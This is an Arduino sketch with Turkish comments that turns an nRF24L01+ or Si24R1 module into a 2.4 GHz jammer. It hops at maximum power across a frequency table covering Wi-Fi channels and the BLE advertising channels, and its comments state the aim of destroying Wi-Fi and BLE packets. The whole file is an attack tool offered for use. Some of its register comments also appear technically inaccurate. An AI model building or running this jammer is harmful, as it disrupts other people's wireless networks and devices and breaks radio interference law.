#include <SPI.h>
#include <RF24.h>

#define CE_PIN  9
#define CSN_PIN 10

RF24 radio(CE_PIN, CSN_PIN);

// nRF24L01+ & Si24R1 Register Adresleri
#define NRF_EN_AA       0x01
#define NRF_RF_CH       0x05
#define NRF_RF_SETUP    0x06

// TÜM 2.4 GHz SPEKTRUMUNU (Wi-Fi 1-14 + BLE 37/38/39) SIFIR BOŞLUKLA KAPSAYAN NİHAİ KUSURSUZ FREKANS TABLOSU
const uint8_t hopTable[] = {
  // Wi-Fi CH1 & BLE Adv 37 (2401-2425 MHz)
  1, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 23, 25,
  // BLE Adv 38 & Wi-Fi CH6 Tam Merkez Bölgesi (2426-2448 MHz)
  22, 26, 29, 32, 37, 38, 40, 42,
  // Wi-Fi CH11 Tam Merkez Bölgesi (2451-2473 MHz)
  44, 48, 51, 56, 60, 62, 64, 66,
  // Wi-Fi CH13 Tam Merkez Bölgesi (2472-2484 MHz)
  68, 70, 72, 75, 77,
  // BLE Adv 39 & Üst Bluetooth bölgesi (2480 MHz)
  74, 78, 80, 83
};
const uint8_t hopSize = sizeof(hopTable) / sizeof(hopTable[0]);

// Doğrudan SPI Register Yazma Fonksiyonu
void writeRegister(uint8_t reg, uint8_t value) {
  digitalWrite(CSN_PIN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20); // WRITE_REG Komutu
  SPI.transfer(value);
  digitalWrite(CSN_PIN, HIGH);
}

void setup() {
  SPI.begin();
  SPI.setClockDivider(SPI_CLOCK_DIV2); // 8 MHz Maksimum Donanımsal SPI

  if (!radio.begin()) {
    pinMode(LED_BUILTIN, OUTPUT);
    while (1) {
      digitalWrite(LED_BUILTIN, HIGH);
      delay(100);
      digitalWrite(LED_BUILTIN, LOW);
      delay(100);
    }
  }

  // 1. Temel RF Yapılandırması (Maksimum Güç & 2 Mbps)
  radio.setAutoAck(false);
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX);         // PA Max (+20 dBm PA/LNA çıkışı)
  radio.setDataRate(RF24_2MBPS);         // 2 Mbps geniş spektrum kirliliği
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.stopListening();
  
  // 2. Güç Açılışı ve RF Katı Stabilizasyonu
  radio.powerUp();
  delayMicroseconds(2000); // 2ms Güç Katı Stabilizasyonu

  // 💥 KARARLI CONTINUOUS CARRIER REGISTER AYARI (0x3E) 💥
  writeRegister(NRF_RF_SETUP, 0x3E);
  writeRegister(NRF_EN_AA, 0x00);
}

void loop() {
  // KLON ÇİP GÜVENLİKLİ, FREKANS KİLİTLENMELİ (CE STROBE) VE HIZLI DÖNGÜ
  for (uint8_t i = 0; i < hopSize; i++) {
    // 1. CE LOW yapılarak sentezleyici kilitlenmesi çözülür
    digitalWrite(CE_PIN, LOW);
    
    // 2. Yeni frekans ve Si24R1 klon çip koruma biti (0x3E) yazılır
    writeRegister(NRF_RF_CH, hopTable[i]);
    writeRegister(NRF_RF_SETUP, 0x3E); // Klon çiplerde CONT_WAVE modunun düşmesini engeller
    
    // 3. PLL kilitlenme süresi (130 Mikrosaniye)
    delayMicroseconds(130);
    
    // 4. CE HIGH yapılarak kesintisiz RF taşıyıcı dalga tetiklenir
    digitalWrite(CE_PIN, HIGH);
    
    // 5. Wi-Fi & BLE paketlerini imha eden ultra kararlı yayın süresi (170 Mikrosaniye)
    delayMicroseconds(170);
  }
}